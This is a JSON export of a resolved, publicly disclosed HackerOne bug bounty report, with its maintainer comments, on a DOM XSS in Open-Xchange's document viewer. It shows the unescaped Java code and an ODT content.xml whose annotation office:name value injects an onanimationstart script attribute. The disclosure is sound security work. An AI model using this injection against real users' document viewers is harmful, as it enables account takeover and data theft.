{"id":894915,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQ5MTU=","url":"https://hackerone.com/reports/894915","title":"XSS on opening a malicious OpenOffice text document","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-06-09T22:33:37.505Z","submitted_at":"2020-06-09T22:33:37.505Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skr0x1c0","url":"/skr0x1c0","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8906,"url":"https://hackerone.com/open-xchange","handle":"open-xchange","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/JtYLEsu5yRZxGitSmAjeAFtK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Open-Xchange","twitter_handle":"openxchange","website":"https://www.open-xchange.com/","about":"Messaging, collaboration and office productivity software for service providers"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-11-23T11:35:40.531Z","bug_reporter_agreed_on_going_public_at":"2020-09-24T07:56:33.803Z","team_member_agreed_on_going_public_at":"2020-11-23T11:35:40.453Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Title\nOpening a malicious OpenOffice text document may lead to cross site scripting (XSS) attacks\n\n# Description\nWhen generating HTML content for a comment present in text file, a placeholder `div` is generated by [CommentPlaceHolder.java](https://gitlab.open-xchange.com/documents/office/-/blob/develop/com.openexchange.office.htmldoc/src/com/openexchange/office/htmldoc/CommentPlaceHolder.java#L79). The attribute `data-container-id` of this `div` is directly constructed from the field `id` without any HTML escaping as shown below.\n\n``` java\npublic class CommentPlaceHolder extends SubNode {\n    private static final String PLACEHOLDERSTART = \"\u003cdiv contenteditable=\\\"false\\\" class=\\\"inline commentplaceholder\\\" data-container-id=\\\"\";\n    private static final String PLACEHOLDERCLOSER = \"\\\"\";\n    private static final String PLACEHOLDEREND = \"\u003e\u003c/div\u003e\";\n\n    private String              id;\n\n    public CommentPlaceHolder(int position, String id) {\n        super(position, 1);\n        this.id = id;\n    }\n\n    @Override\n    public boolean appendContent(StringBuilder document) throws Exception {\n        document.append(PLACEHOLDERSTART + this.id + PLACEHOLDERCLOSER);\n\n        JSONObject params = new JSONObject();\n        params.put(\"containerId\", id);\n\n        document.append(\" jquerydata='\");\n        document.append(params.toString());\n        document.append(\"'\");\n        document.append(PLACEHOLDEREND);\n\n        return true;\n    }\n    ...\n}\n```\n\nFor an OpenDocument text file, the `id` field is constructed from attribute `office:name` of the element `office:annotation`. This attribute may contain \"double quotes\" which can be used for injecting arbitary HTML code into the generated HTML. A `odt` document with `content.xml` file of following format will execute `alert(document.domain)` javascript code when user opens the document.\n\n``` xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003coffice:document-content ...\u003e\n    ...\n    \u003coffice:body\u003e\n        \u003coffice:text\u003e\n            ...\n            \u003ctext:p text:style-name=\"Standard\"\u003e\n                \u003ctext:span\u003e\n                    \u003coffice:annotation\n                            office:name=\"cmt695a_0\u0026quot; style=\u0026quot;animation-name: fa-spin\u0026quot; onanimationstart=\u0026quot;alert(document.domain)\"\u003e\n                        \u003cdc:creator\u003eTest User\u003c/dc:creator\u003e\n                        \u003cdc:date\u003e2020-06-09T23:05:00Z\u003c/dc:date\u003e\n                        \u003ctext:p text:style-name=\"p829040448\"\u003e\n                            \u003ctext:span\u003eHello comment\u003c/text:span\u003e\n                        \u003c/text:p\u003e\n                    \u003c/office:annotation\u003e\n                    Hello World!\n                    \u003coffice:annotation-end office:name=\"cmt695a_0\"/\u003e\n                \u003c/text:span\u003e\n            \u003c/text:p\u003e\n        \u003c/office:text\u003e\n    \u003c/office:body\u003e\n\u003c/office:document-content\u003e\n```\n\nThe generated HTML for the comment placeholder is of following format\n``` xml\n\u003cdiv contenteditable=\"false\" class=\"inline commentplaceholder\" data-container-id=\"cmt695a_0\"\n     style=\"animation-name: fa-spin\" onanimationstart=\"alert(document.domain)\" jquerydata='...'\u003e\n\u003c/div\u003e\n```\n\n# Steps to reproduce\n1. Upload attached `payload_comment_placeholder.odt` to OX drive\n2. Open the `payload_comment_placeholder.odt` file. This will trigger an alert dialog with value `document.domain`\n\n## Impact\n\nThis XSS can execute arbitary javascript code without any user interaction when the user opens a maliciously crafted OpenOffice text document. This may be used for extracting and tampering user data (including encrypted documents) and executing other actions on user account like sending emails.","vulnerability_information_html":"\u003ch1 id=\"title\"\u003eTitle\u003c/h1\u003e\n\n\u003cp\u003eOpening a malicious OpenOffice text document may lead to cross site scripting (XSS) attacks\u003c/p\u003e\n\n\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\n\u003cp\u003eWhen generating HTML content for a comment present in text file, a placeholder \u003ccode\u003ediv\u003c/code\u003e is generated by \u003ca href=\"/redirect?url=https%3A%2F%2Fgitlab.open-xchange.com%2Fdocuments%2Foffice%2F-%2Fblob%2Fdevelop%2Fcom.openexchange.office.htmldoc%2Fsrc%2Fcom%2Fopenexchange%2Foffice%2Fhtmldoc%2FCommentPlaceHolder.java%23L79\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCommentPlaceHolder.java\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The attribute \u003ccode\u003edata-container-id\u003c/code\u003e of this \u003ccode\u003ediv\u003c/code\u003e is directly constructed from the field \u003ccode\u003eid\u003c/code\u003e without any HTML escaping as shown below.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eCommentPlaceHolder\u003c/span\u003e \u003cspan class=\"kd\"\u003eextends\u003c/span\u003e \u003cspan class=\"nc\"\u003eSubNode\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"no\"\u003ePLACEHOLDERSTART\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026lt;div contenteditable=\\\u0026quot;false\\\u0026quot; class=\\\u0026quot;inline commentplaceholder\\\u0026quot; data-container-id=\\\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"no\"\u003ePLACEHOLDERCLOSER\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\\\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"no\"\u003ePLACEHOLDEREND\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e              \u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"nf\"\u003eCommentPlaceHolder\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eposition\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003esuper\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eposition\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"nd\"\u003e@Override\u003c/span\u003e\u003cspan class=\"o\"\u003e](/\u003c/span\u003e\u003cspan class=\"n\"\u003eoverride\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003eboolean\u003c/span\u003e \u003cspan class=\"nf\"\u003eappendContent\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eStringBuilder\u003c/span\u003e \u003cspan class=\"n\"\u003edocument\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003edocument\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eappend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003ePLACEHOLDERSTART\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eid\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"no\"\u003ePLACEHOLDERCLOSER\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003eparams\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;containerId\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eid\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"n\"\u003edocument\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eappend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot; jquerydata=\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003edocument\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eappend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eparams\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n        \u003cspan class=\"n\"\u003edocument\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eappend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003edocument\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eappend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"no\"\u003ePLACEHOLDEREND\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFor an OpenDocument text file, the \u003ccode\u003eid\u003c/code\u003e field is constructed from attribute \u003ccode\u003eoffice:name\u003c/code\u003e of the element \u003ccode\u003eoffice:annotation\u003c/code\u003e. This attribute may contain \u0026quot;double quotes\u0026quot; which can be used for injecting arbitary HTML code into the generated HTML. A \u003ccode\u003eodt\u003c/code\u003e document with \u003ccode\u003econtent.xml\u003c/code\u003e file of following format will execute \u003ccode\u003ealert(document.domain)\u003c/code\u003e javascript code when user opens the document.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;office:document-content\u003c/span\u003e \u003cspan class=\"err\"\u003e...\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    ...\n    \u003cspan class=\"nt\"\u003e\u0026lt;office:body\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;office:text\u0026gt;\u003c/span\u003e\n            ...\n            \u003cspan class=\"nt\"\u003e\u0026lt;text:p\u003c/span\u003e \u003cspan class=\"na\"\u003etext:style-name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Standard\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;text:span\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;office:annotation\u003c/span\u003e\n                            \u003cspan class=\"na\"\u003eoffice:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cmt695a_0\u0026amp;quot; style=\u0026amp;quot;animation-name: fa-spin\u0026amp;quot; onanimationstart=\u0026amp;quot;alert(document.domain)\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;dc:creator\u0026gt;\u003c/span\u003eTest User\u003cspan class=\"nt\"\u003e\u0026lt;/dc:creator\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;dc:date\u0026gt;\u003c/span\u003e2020-06-09T23:05:00Z\u003cspan class=\"nt\"\u003e\u0026lt;/dc:date\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;text:p\u003c/span\u003e \u003cspan class=\"na\"\u003etext:style-name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;p829040448\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                            \u003cspan class=\"nt\"\u003e\u0026lt;text:span\u0026gt;\u003c/span\u003eHello comment\u003cspan class=\"nt\"\u003e\u0026lt;/text:span\u0026gt;\u003c/span\u003e\n                        \u003cspan class=\"nt\"\u003e\u0026lt;/text:p\u0026gt;\u003c/span\u003e\n                    \u003cspan class=\"nt\"\u003e\u0026lt;/office:annotation\u0026gt;\u003c/span\u003e\n                    Hello World!\n                    \u003cspan class=\"nt\"\u003e\u0026lt;office:annotation-end\u003c/span\u003e \u003cspan class=\"na\"\u003eoffice:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cmt695a_0\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;/text:span\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/text:p\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/office:text\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/office:body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/office:document-content\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe generated HTML for the comment placeholder is of following format\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;div\u003c/span\u003e \u003cspan class=\"na\"\u003econtenteditable=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;false\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eclass=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;inline commentplaceholder\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003edata-container-id=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cmt695a_0\u0026quot;\u003c/span\u003e\n     \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;animation-name: fa-spin\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eonanimationstart=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;alert(document.domain)\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ejquerydata=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;...\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/div\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h1\u003e\n\n\u003col\u003e\n\u003cli\u003eUpload attached \u003ccode\u003epayload_comment_placeholder.odt\u003c/code\u003e to OX drive\u003c/li\u003e\n\u003cli\u003eOpen the \u003ccode\u003epayload_comment_placeholder.odt\u003c/code\u003e file. This will trigger an alert dialog with value \u003ccode\u003edocument.domain\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis XSS can execute arbitary javascript code without any user interaction when the user opens a maliciously crafted OpenOffice text document. This may be used for extracting and tampering user data (including encrypted documents) and executing other actions on user account like sending emails.\u003c/p\u003e\n","bounty_amount":"400.0","formatted_bounty":"$400","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":861423,"file_name":"payload_comment_placeholder.odt","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1MTSG5kh8sBdsugbPRaAXfGk?response-content-disposition=attachment%3B%20filename%3D%22payload_comment_placeholder.odt%22%3B%20filename%2A%3DUTF-8%27%27payload_comment_placeholder.odt\u0026response-content-type=application%2Fvnd.oasis.opendocument.text\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070752Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026X-Amz-Signature=5270f753c68521913584e0e0d54f5bad1244338e45e1e6ddf6bfc4c4c675a045","file_size":13920,"type":"application/vnd.oasis.opendocument.text"}],"allow_singular_disclosure_at":null,"vote_count":18,"voters":["bombon","secator","mygf","aporlorxl23","what_web","h4x0r-dz","t3chn0phil3","nims786","h1-qualys-scan","samuraisnotebook","and 8 more..."],"severity":{"rating":"medium","score":5.4,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":551,"asset_type":"URL","asset_identifier":"sandbox.open-xchange.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8254154,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, i'll have a look on this.","markdown_message":"\u003cp\u003eThanks for the report, i\u0026#39;ll have a look on this.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-10T13:01:44.944Z","updated_at":"2020-06-10T13:01:44.944Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8254370,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-10T13:24:13.036Z","updated_at":"2020-06-10T13:24:13.036Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8254382,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-10T13:25:00.983Z","updated_at":"2020-06-10T13:25:00.983Z","additional_data":{"old_severity":"High (8.1)","new_severity":"Medium (5.4)","old_severity_id":745610,"new_severity_id":746306},"actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8271386,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.\n\nWe'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories \"researcher credits\"?","markdown_message":"\u003cp\u003eThanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories \u0026quot;researcher credits\u0026quot;?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-12T09:48:42.070Z","updated_at":"2020-06-12T09:48:42.070Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8279273,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mheiland,\n\nYes, I would like to be included in the advisories. Please use following information for the same:\nSreejith Krishnan R(@skr0x1c0)","markdown_message":"\u003cp\u003eHi \u003ca href=\"/mheiland\"\u003e@mheiland\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eYes, I would like to be included in the advisories. Please use following information for the same:\u003cbr\u003e\nSreejith Krishnan R(@skr0x1c0)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-13T00:09:08.417Z","updated_at":"2020-06-13T00:09:08.417Z","actor":{"username":"skr0x1c0","cleared":false,"url":"/skr0x1c0","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8303045,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-16T07:34:09.017Z","updated_at":"2020-06-16T07:34:09.017Z","actor":{"username":"mheiland","cleared":false,"url":"/mheiland","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/425JKsXEnCYsDU1VA48SXXZV/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skr0x1c0","url":"/skr0x1c0"},"genius_execution_id":null,"team_handle":"open-xchange","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":83